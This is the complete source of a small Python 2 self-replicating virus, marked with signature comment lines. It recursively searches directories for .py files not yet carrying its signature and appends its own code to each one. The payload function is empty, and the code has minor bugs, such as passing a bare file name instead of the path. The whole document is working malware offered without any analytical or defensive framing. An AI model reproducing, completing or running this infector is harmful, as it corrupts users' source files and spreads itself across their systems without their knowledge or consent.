### :)(: ###
import os

black_list = ['$RECYCLE.BIN', 'System Volume Information','Recovery']
def search(path):
    # search all file .py in path which aren't infected
    if not os.path.isdir(path):
        return
    files = os.listdir(path)
    for file in files:
        file_path = path + "/" + file
        if file not in black_list and os.path.isdir(file_path):
            search(file_path)
        elif file[-3:] == '.py':
            if not is_infected(file_path):
                infect(file)
                print file_path

def infect(file_path):
    # copy all content of virus to file
    virus_file = open(__file__)
    virus_data = virus_file.read()
    virus_file.close()
    cary_file = open(file_path, 'a')
    cary_file.write(10*'\n' + virus_data)
    cary_file.close

def is_infected(file_path):
    lines = open(file_path)
    for line in lines:
        if line == "### :)(: ###\n":
            return True
    return False

def behave():
    return

# main
search(os.path.abspath(""))
### end virus ###
